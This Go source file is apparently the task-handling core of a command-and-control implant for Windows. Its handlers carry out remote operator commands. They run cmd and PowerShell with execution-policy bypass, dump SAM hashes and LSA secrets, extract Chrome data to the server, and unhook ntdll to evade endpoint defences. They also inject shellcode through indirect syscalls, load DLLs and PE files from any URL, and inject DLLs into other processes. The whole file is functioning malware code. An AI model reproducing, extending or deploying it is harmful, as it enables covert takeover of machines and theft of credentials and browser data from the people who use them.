package tasks

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"
	"unsafe"

	"github.com/carved4/carved/implant/pkg/modules/chrome"
	"github.com/carved4/carved/implant/pkg/modules/creds"
	"github.com/carved4/carved/implant/pkg/modules/exec"
	"github.com/carved4/carved/implant/pkg/modules/loader"
	"github.com/carved4/carved/implant/pkg/modules/shellcode"
	"github.com/carved4/carved/implant/pkg/transport"
	"github.com/carved4/carved/shared/proto"
	wc "github.com/carved4/go-wincall"
)

var Config struct {
	Sleep     *uint32
	Jitter    *uint8
	ServerURL string
}

func init() {

	Register(proto.TaskShell, handleShell)
	Register(proto.TaskPowershell, handlePowershell)
	Register(proto.TaskCD, handleCD)
	Register(proto.TaskPWD, handlePWD)
	Register(proto.TaskLS, handleLS)
	Register(proto.TaskCat, handleCat)
	Register(proto.TaskUpload, handleUpload)
	Register(proto.TaskDownload, handleDownload)
	Register(proto.TaskMkdir, handleMkdir)
	Register(proto.TaskRm, handleRm)
	Register(proto.TaskPS, handlePS)
	Register(proto.TaskKill, handleKill)
	Register(proto.TaskWhoami, handleWhoami)
	Register(proto.TaskEnv, handleEnv)
	Register(proto.TaskSleep, handleSleep)
	Register(proto.TaskExit, handleExit)
	Register(proto.TaskHashdump, handleHashdump)
	Register(proto.TaskChrome, handleChrome)
	Register(proto.TaskUnhook, handleUnhook)
	Register(proto.TaskExecute, handleExecute)
	Register(proto.TaskLoadDLL, handleLoadDLL)
	Register(proto.TaskLoadPE, handleLoadPE)
	Register(proto.TaskInjectDLL, handleInjectDLL)
	Register(proto.TaskLSASecrets, handleHashdump)
	Register(proto.TaskBOF, handleBOF)
}

func success(task *proto.Task, output []byte) *proto.TaskResult {
	return &proto.TaskResult{
		TaskID:    task.ID,
		ImplantID: task.ImplantID,
		Status:    proto.StatusComplete,
		Output:    output,
		Completed: time.Now(),
	}
}

func fail(task *proto.Task, err string) *proto.TaskResult {
	return &proto.TaskResult{
		TaskID:    task.ID,
		ImplantID: task.ImplantID,
		Status:    proto.StatusError,
		Error:     err,
		Completed: time.Now(),
	}
}

func handleShell(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no command specified")
	}
	cmd := strings.Join(task.Args, " ")
	output := exec.ExecCmd("cmd.exe /c " + cmd)
	return success(task, []byte(output))
}

func handlePowershell(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no command specified")
	}
	cmd := strings.Join(task.Args, " ")
	output := exec.ExecCmd("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + cmd)
	return success(task, []byte(output))
}

func handleCD(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no directory specified")
	}
	if err := os.Chdir(task.Args[0]); err != nil {
		return fail(task, err.Error())
	}
	pwd, _ := os.Getwd()
	return success(task, []byte(pwd))
}

func handlePWD(task *proto.Task) *proto.TaskResult {
	pwd, err := os.Getwd()
	if err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte(pwd))
}

func handleLS(task *proto.Task) *proto.TaskResult {
	dir := "."
	if len(task.Args) > 0 {
		dir = task.Args[0]
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return fail(task, err.Error())
	}
	var sb strings.Builder
	for _, e := range entries {
		info, _ := e.Info()
		if info != nil {
			sb.WriteString(fmt.Sprintf("%s\t%d\t%s\t%s\n",
				info.Mode().String(),
				info.Size(),
				info.ModTime().Format("2006-01-02 15:04"),
				e.Name()))
		} else {
			sb.WriteString(e.Name() + "\n")
		}
	}
	return success(task, []byte(sb.String()))
}

func handleCat(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no file specified")
	}
	data, err := os.ReadFile(task.Args[0])
	if err != nil {
		return fail(task, err.Error())
	}
	return success(task, data)
}

func handleUpload(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no destination path specified")
	}
	if len(task.Data) == 0 {
		return fail(task, "no data to upload")
	}
	if err := os.WriteFile(task.Args[0], task.Data, 0644); err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte(fmt.Sprintf("uploaded %d bytes to %s", len(task.Data), task.Args[0])))
}

func handleDownload(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no file specified")
	}
	data, err := os.ReadFile(task.Args[0])
	if err != nil {
		return fail(task, err.Error())
	}
	return success(task, data)
}

func handleMkdir(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no directory specified")
	}
	if err := os.MkdirAll(task.Args[0], 0755); err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte("created "+task.Args[0]))
}

func handleRm(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no path specified")
	}
	if err := os.RemoveAll(task.Args[0]); err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte("removed "+task.Args[0]))
}

func handlePS(task *proto.Task) *proto.TaskResult {
	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	createSnapshot := wc.GetFunctionAddress(k32, wc.GetHash("CreateToolhelp32Snapshot"))
	process32First := wc.GetFunctionAddress(k32, wc.GetHash("Process32FirstW"))
	process32Next := wc.GetFunctionAddress(k32, wc.GetHash("Process32NextW"))
	closeHandle := wc.GetFunctionAddress(k32, wc.GetHash("CloseHandle"))

	const TH32CS_SNAPPROCESS = 0x00000002

	type processEntry32 struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	snap, _, _ := wc.CallG0(createSnapshot, TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return fail(task, "CreateToolhelp32Snapshot failed")
	}
	defer wc.CallG0(closeHandle, snap)

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))

	ret, _, _ := wc.CallG0(process32First, snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return fail(task, "Process32First failed")
	}

	var sb strings.Builder
	for {
		name := wc.UTF16ToString(&pe.szExeFile[0])
		pid := pe.th32ProcessID

		// Mimic tasklist /FO CSV /NH format: "Image Name","PID","Session Name","Session#","Mem Usage"
		sb.WriteString(fmt.Sprintf("\"%s\",\"%d\",\"Console\",\"0\",\"0 K\"\n", name, pid))

		ret, _, _ = wc.CallG0(process32Next, snap, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}

	return success(task, []byte(sb.String()))
}

func handleKill(task *proto.Task) *proto.TaskResult {
	if len(task.Args) == 0 {
		return fail(task, "no PID specified")
	}
	output := exec.ExecCmd("taskkill /F /PID " + task.Args[0])
	return success(task, []byte(output))
}

func handleWhoami(task *proto.Task) *proto.TaskResult {
	output := exec.ExecCmd("whoami /all")
	return success(task, []byte(output))
}

func handleEnv(task *proto.Task) *proto.TaskResult {
	env := os.Environ()
	return success(task, []byte(strings.Join(env, "\n")))
}

func handleSleep(task *proto.Task) *proto.TaskResult {
	var sleepSec uint32 = 5
	var jitterPct uint8 = 10
	if len(task.Args) > 0 {
		if err := json.Unmarshal([]byte(task.Args[0]), &sleepSec); err == nil {
		} else {
			var args SleepArgs
			if err := json.Unmarshal([]byte(task.Args[0]), &args); err == nil {
				sleepSec = args.Sleep
				jitterPct = args.Jitter
			}
		}
	}
	if len(task.Args) > 1 {
		var j uint8
		if err := json.Unmarshal([]byte(task.Args[1]), &j); err == nil {
			jitterPct = j
		}
	}
	if Config.Sleep != nil {
		*Config.Sleep = sleepSec
	}
	if Config.Jitter != nil {
		*Config.Jitter = jitterPct
	}
	return success(task, []byte(fmt.Sprintf("sleep=%ds jitter=%d%%", sleepSec, jitterPct)))
}

func handleExit(task *proto.Task) *proto.TaskResult {
	os.Exit(0)
	return nil
}

func handleHashdump(task *proto.Task) *proto.TaskResult {
	result, err := creds.DumpHashes()
	if err != nil {
		return fail(task, err.Error())
	}
	var sb strings.Builder

	if result.ComputerName != "" {
		sb.WriteString(fmt.Sprintf("[+] computer: %s\n", result.ComputerName))
	}
	if result.IsDomainJoined {
		sb.WriteString(fmt.Sprintf("[+] domain: %s (domain-joined)\n", result.DomainName))
	} else {
		sb.WriteString(fmt.Sprintf("[+] domain: %s (workgroup)\n", result.DomainName))
	}
	sb.WriteString(fmt.Sprintf("[+] bootkey: %x\n\n", result.BootKey))

	sb.WriteString("[+] sam credentials\n")
	for _, cred := range result.Credentials {
		sb.WriteString(fmt.Sprintf("    %s:%d:%s:%s\n", cred.Username, cred.RID, cred.NTHash, cred.Status))
	}

	if len(result.LSASecrets) > 0 {
		sb.WriteString("\n[+] lsa secrets\n")
		for _, secret := range result.LSASecrets {
			sb.WriteString(fmt.Sprintf("    [%s] %s\n", secret.Type, secret.Name))
			if secret.Password != "" {
				sb.WriteString(fmt.Sprintf("        password: %s\n", secret.Password))
			}
			if len(secret.NTHash) > 0 {
				sb.WriteString(fmt.Sprintf("        nthash: %x\n", secret.NTHash))
			}
			if len(secret.MachineKey) > 0 {
				sb.WriteString(fmt.Sprintf("        machinekey: %x\n", secret.MachineKey))
			}
			if len(secret.UserKey) > 0 {
				sb.WriteString(fmt.Sprintf("        userkey: %x\n", secret.UserKey))
			}
			if secret.MatchedUser != "" {
				sb.WriteString(fmt.Sprintf("        matcheduser: %s\n", secret.MatchedUser))
			}
		}
	}

	return success(task, []byte(sb.String()))
}

func handleChrome(task *proto.Task) *proto.TaskResult {
	data, err := chrome.Extract(Config.ServerURL)
	if err != nil {
		return fail(task, err.Error())
	}
	return success(task, data)
}

func handleUnhook(task *proto.Task) *proto.TaskResult {
	wc.UnhookNtdll()
	return success(task, []byte("ntdll.dll unhooked"))
}

func handleExecute(task *proto.Task) *proto.TaskResult {
	var args ExecuteArgs
	if len(task.Args) > 0 {
		if err := json.Unmarshal([]byte(task.Args[0]), &args); err != nil {
			return fail(task, "invalid args: "+err.Error())
		}
	}

	if len(task.Data) == 0 {
		return fail(task, "no shellcode data provided")
	}

	if args.Method == "" {
		args.Method = "indirect"
	}

	var err error
	switch args.Method {
	case "enclave":
		err = shellcode.EnclaveInject(task.Data)
	case "indirect":
		err = shellcode.IndirectSyscallInject(task.Data)
	case "once":
		err = shellcode.RunOnce(task.Data)
	default:
		return fail(task, "invalid method: "+args.Method+" (valid: enclave, indirect, once)")
	}

	if err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte(fmt.Sprintf("shellcode executed using %s method (%d bytes)", args.Method, len(task.Data))))
}

func handleLoadDLL(task *proto.Task) *proto.TaskResult {
	var args LoadArgs
	if len(task.Args) > 0 {
		arg := task.Args[0]
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			args.URL = arg
		} else if err := json.Unmarshal([]byte(arg), &args); err != nil {
			return fail(task, "invalid args: "+err.Error())
		}
	}

	if len(task.Args) > 1 {
		arg := task.Args[1]
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			args.URL = arg
		}
	}

	var dllBytes []byte
	var err error

	if args.URL != "" {
		if transport.IsSameOrigin(args.URL, Config.ServerURL) {
			dllBytes, err = transport.Download(args.URL)
		} else {
			dllBytes, err = transport.DownloadRaw(args.URL)
		}

		if err != nil {
			return fail(task, "download failed: "+err.Error())
		}
	} else if len(task.Data) > 0 {
		dllBytes = task.Data
	} else {
		return fail(task, "no DLL data or URL provided")
	}
	if err := loader.LoadDLL(dllBytes); err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte("DLL loaded locally"))
}

func handleLoadPE(task *proto.Task) *proto.TaskResult {
	var args LoadArgs
	if len(task.Args) > 0 {
		arg := task.Args[0]
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			args.URL = arg
		} else if err := json.Unmarshal([]byte(arg), &args); err != nil {
			return fail(task, "invalid args: "+err.Error())
		}
	}

	if len(task.Args) > 1 {
		arg := task.Args[1]
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			args.URL = arg
		}
	}

	var peBytes []byte
	var err error

	if args.URL != "" {
		if transport.IsSameOrigin(args.URL, Config.ServerURL) {
			peBytes, err = transport.Download(args.URL)
		} else {
			peBytes, err = transport.DownloadRaw(args.URL)
		}

		if err != nil {
			return fail(task, "download failed: "+err.Error())
		}
	} else if len(task.Data) > 0 {
		peBytes = task.Data
	} else {
		return fail(task, "no PE data or URL provided")
	}

	loader.LoadPe(peBytes)
	return success(task, []byte(fmt.Sprintf("PE loaded (%d bytes)", len(peBytes))))
}

func handleInjectDLL(task *proto.Task) *proto.TaskResult {
	var args LoadArgs
	if len(task.Args) > 0 {
		arg := task.Args[0]
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			args.URL = arg
		} else if pid, err := parseUint32(arg); err == nil && pid > 0 {
			args.PID = pid
		} else if !strings.HasPrefix(arg, "{") {
			args.Process = arg
		} else if err := json.Unmarshal([]byte(arg), &args); err != nil {
			return fail(task, "invalid args: "+err.Error())
		}
	}

	if len(task.Args) > 1 {
		arg := task.Args[1]
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			args.URL = arg
		}
	}

	var dllBytes []byte
	var err error

	if args.URL != "" {
		if transport.IsSameOrigin(args.URL, Config.ServerURL) {
			dllBytes, err = transport.Download(args.URL)
		} else {
			dllBytes, err = transport.DownloadRaw(args.URL)
		}

		if err != nil {
			return fail(task, "download failed: "+err.Error())
		}
	} else if len(task.Data) > 0 {
		dllBytes = task.Data
	} else {
		return fail(task, "no DLL data or URL provided")
	}

	var hProcess uintptr
	if args.PID != 0 {
		hProcess, err = openProcess(args.PID)
		if err != nil {
			return fail(task, err.Error())
		}
		defer closeHandle(hProcess)
	} else if args.Process != "" {
		pid, err := findProcess(args.Process)
		if err != nil {
			return fail(task, "failed to find process: "+err.Error())
		}
		hProcess, err = openProcess(pid)
		if err != nil {
			return fail(task, err.Error())
		}
		defer closeHandle(hProcess)
		args.PID = pid
	} else {
		return fail(task, "no PID or process name specified")
	}

	if err := loader.LoadDLLRemote(hProcess, dllBytes); err != nil {
		return fail(task, err.Error())
	}
	return success(task, []byte(fmt.Sprintf("DLL injected into PID %d", args.PID)))
}

func openProcess(pid uint32) (uintptr, error) {
	openProc := wc.GetSyscall(wc.GetHash("NtOpenProcess"))

	type clientID struct {
		pid uintptr
		tid uintptr
	}
	type objectAttributes struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	var hProcess uintptr
	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	cid := clientID{pid: uintptr(pid)}

	access := uintptr(0x001F0FFF)
	ret, _ := wc.IndirectSyscall(openProc.SSN, openProc.Address,
		uintptr(unsafe.Pointer(&hProcess)),
		access,
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)))

	if ret != 0 {
		return 0, fmt.Errorf("NtOpenProcess failed: 0x%x", ret)
	}
	return hProcess, nil
}

func closeHandle(h uintptr) {
	closeHandleNt := wc.GetSyscall(wc.GetHash("NtClose"))
	wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, h)
}

func findProcess(name string) (uint32, error) {
	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	createSnapshot := wc.GetFunctionAddress(k32, wc.GetHash("CreateToolhelp32Snapshot"))
	process32First := wc.GetFunctionAddress(k32, wc.GetHash("Process32FirstW"))
	process32Next := wc.GetFunctionAddress(k32, wc.GetHash("Process32NextW"))
	closeHandle := wc.GetFunctionAddress(k32, wc.GetHash("CloseHandle"))

	const TH32CS_SNAPPROCESS = 0x00000002

	type processEntry32 struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	snap, _, _ := wc.CallG0(createSnapshot, TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer wc.CallG0(closeHandle, snap)

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))

	ret, _, _ := wc.CallG0(process32First, snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return 0, fmt.Errorf("Process32First failed")
	}

	targetLower := strings.ToLower(name)
	for {
		exeName := wc.UTF16ToString(&pe.szExeFile[0])
		if strings.ToLower(exeName) == targetLower {
			return pe.th32ProcessID, nil
		}

		ret, _, _ = wc.CallG0(process32Next, snap, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("process '%s' not found", name)
}

func handleBOF(task *proto.Task) *proto.TaskResult {
	var args BOFArgs
	if len(task.Args) > 0 {
		if err := json.Unmarshal([]byte(task.Args[0]), &args); err != nil {
			return fail(task, "invalid args: "+err.Error())
		}
	}

	var coffBytes []byte
	var err error

	if args.URL != "" {
		coffBytes, err = transport.Download(args.URL)
		if err != nil {
			return fail(task, "download failed: "+err.Error())
		}
	} else if len(task.Data) > 0 {
		coffBytes = task.Data
	} else {
		return fail(task, "no BOF data or URL provided")
	}

	entryPoint := "go"
	if args.Entry != "" {
		entryPoint = args.Entry
	}

	var bofArgs []byte
	if len(task.Args) > 1 {

		bofArgs = packBOFArgsFromStrings(task.Args[1:])
	}

	output, err := loader.LoadBOFWithEntry(coffBytes, bofArgs, entryPoint)
	if err != nil {
		return fail(task, err.Error())
	}

	return success(task, []byte(output))
}

func packBOFArgsFromStrings(args []string) []byte {

	packed, err := loader.PackArgs(args)
	if err != nil {
		return nil
	}
	return packed
}
